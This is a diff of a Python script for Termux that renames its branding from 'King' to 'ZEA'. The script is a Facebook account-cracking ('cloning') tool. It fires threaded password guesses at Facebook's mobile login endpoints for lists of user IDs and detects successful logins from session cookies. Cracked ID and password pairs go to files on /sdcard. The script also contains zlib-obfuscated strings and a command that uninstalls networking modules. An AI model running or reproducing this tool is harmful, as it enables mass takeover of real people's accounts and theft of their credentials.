@@ -66,7 +66,7 @@ try:
 except Exception as e:
         print(e)
         print('\n Installing modules wait !')
-        os.system('pip install futures==2 && python King.py')
+        os.system('pip install futures==2 && python ZEA.py')
 except FileExistsError:
         os.system('pip uninstall requests urllib3 idna certifi -y')
         pass
@@ -94,7 +94,7 @@ sz4 = zlib.decompress(b'x\x9c%\xca\xcb\x11\xc20\x0c\x05\xc0V\xdc@\xfc\x08Gj\xa0\
 sz5 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x90\xf4\x11\x05')
 sz6 = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x90\xf3\x11\t')
 sz7 = zlib.decompress(b'x\x9c\x1d\xca[\x0e@0\x10\x05\xd0\x15\xe9%V4j\xd0\xb4\xd5\x9aG\xc2\xee\x89\x9f\xf3u\xb0\x92\x11~b\xab\xc1X\xaa\xdf\xd8Ra\x85\xab\xa0\xa4\x05\xfd\xb1\xa3\x9ds\x98Fh2\x1e:\xc5L\xfb\x17\x84/g5\xc5\x0b\x8bO\x19\xc2')    
-#--checking if file is not avalible
+#--checZEA if file is not avalible
 if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
         pass
         exit("Error in termux modules ")
@@ -199,9 +199,9 @@ cps=[]
 pcp=[]
 id=[]
 tokenku=[]
-def King1(ids,names,passlist):
+def ZEA1(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;32m [King-XD-\033[1;33mM1\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;32m [ZEA-XD-\033[1;33mM1\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -218,18 +218,18 @@ def King1(ids,names,passlist):
                         getlog = session.get('https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        King=session.cookies.get_dict().keys()
-                        if "c_user" in King:
+                        ZEA=session.cookies.get_dict().keys()
+                        if "c_user" in ZEA:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print('\r\r\033[1;32m [𝐊𝐈𝐍𝐆-OK] %s • %s'%(ids,pas))
-                                open('/sdcard/King-F-OK.txt', 'a').write(ids+' • '+pas+'\n')
+                                open('/sdcard/ZEA-F-OK.txt', 'a').write(ids+' • '+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in King:
+                        elif 'checkpoint' in ZEA:
                                 if 'y' in pcp:
                                         print#('\r\r\x1b[38;5;208m [𝐊𝐈𝐍𝐆-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/King-F-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/ZEA-F-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -239,9 +239,9 @@ def King1(ids,names,passlist):
         except requests.exceptions.ConnectionError:
                 time.sleep(20)
         loop+=1
-def King2(ids,names,passlist):
+def ZEA2(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;32m [King-XD-\033[1;33mM2\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;32m [ZEA-XD-\033[1;33mM2\033[1;32m] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -258,18 +258,18 @@ def King2(ids,names,passlist):
                         getlog = session.get('https://x.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post('https://x.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-                        King=session.cookies.get_dict().keys()
-                        if "c_user" in King:
+                        ZEA=session.cookies.get_dict().keys()
+                        if "c_user" in ZEA:
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print('\r\r\033[1;32m [𝐊𝐈𝐍𝐆-OK] %s • %s'%(ids,pas))
-                                open('/sdcard/King-F-OK.txt', 'a').write(ids+' • '+pas+'\n')
+                                open('/sdcard/ZEA-F-OK.txt', 'a').write(ids+' • '+pas+'\n')
                                 oks.append(ids)
                                 break
-                        elif 'checkpoint' in King:
+                        elif 'checkpoint' in ZEA:
                                 if 'y' in pcp:
                                         print#('\r\r\x1b[38;5;208m [𝐊𝐈𝐍𝐆-CP] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/King-F-CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        open('/sdcard/ZEA-F-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -284,25 +284,25 @@ def rdm():
 	print('[1] Random Cloning')
 	print('[0] Exit menu')
 	linex()
-	King=input(' Select Option :')
-	if King =='1':
-		Kings()
-	if King =='0':
+	ZEA=input(' Select Option :')
+	if ZEA =='1':
+		ZEAs()
+	if ZEA =='0':
 		exit(' Thanks for use 👌😜 ')
 
-def Kings():
+def ZEAs():
 	os.system('clear')
 	print(logo)
 	print('[1] Random Pass ')
 	print('[0] Exit menu')
 	linex()
-	King=input('Select Option :')
-	if King =='1':
-		Kingst()
-	if King =='0':
+	ZEA=input('Select Option :')
+	if ZEA =='1':
+		ZEAst()
+	if ZEA =='0':
 		exit(' Thanks for use 👌😜 ')
 		
-def Kingst():
+def ZEAst():
     user=[]
     os.system('clear')
     print(logo)
@@ -329,10 +329,10 @@ def Kingst():
             yaari.submit(rcrack,uid,pwx,tl)
     linex()
     print(' Crack process has been completed')
-    print(' Ids saved in King-OK.txt,in cp King-CP.txt')
+    print(' Ids saved in ZEA-OK.txt,in cp ZEA-CP.txt')
     linex()
     input(' Press Enter to Back')    
-    os.system('python King.py')
+    os.system('python ZEA.py')
 
   
 def rcrack(uid,pwx,tl):
@@ -381,29 +381,29 @@ def rcrack(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
                 print('\033[1;32m[𝐊𝐈𝐍𝐆-OK] '+uid+' • '+ps+'\033[0;97m')
-                open('/sdcard/King-OK.txt', 'a').write(cid+' • '+ps+'\n')
+                open('/sdcard/ZEA-OK.txt', 'a').write(cid+' • '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:156]
                 print('\033[1;31m[𝐊𝐈𝐍𝐆-CP] '+uid+' • '+ps+'\033[0;97m')
-                open('/sdcard/King-CP.txt', 'a').write(cid+' • '+ps+'\n')
+                open('/sdcard/ZEA-CP.txt', 'a').write(cid+' • '+ps+'\n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r[King] %s|%s \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
+        sys.stdout.write('\r[ZEA] %s|%s \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
 
-def King():
+def ZEA():
         try:
                 clear()
-                x = ("King")
-                if x == ("King"):
+                x = ("ZEA")
+                if x == ("ZEA"):
                         print(' [1] File cloning\n [2] Random Cloning\n [3] My facebook \n [0] Exit menu')
                         linex()
                         xd=input('\033[1;32m Choose an option: ')
@@ -460,9 +460,9 @@ def King():
                                                 ids,names = user.split('|')
                                                 passlist = plist
                                                 if mthd in ['1','01']:
-                                                        crack_submit.submit(King1,ids,names,passlist)
+                                                        crack_submit.submit(ZEA1,ids,names,passlist)
                                                 elif mthd in ['2','02']:
-                                                        crack_submit.submit(King2,ids,names,passlist)
+                                                        crack_submit.submit(ZEA2,ids,names,passlist)
                                                 else:
                                                         crack_submit.submit(api1,ids,names,passlist)
                                 
@@ -475,4 +475,4 @@ def King():
         except requests.exceptions.ConnectionError:
                 print('\n No internet connection ...')
                 exit()
-King()
+ZEA()
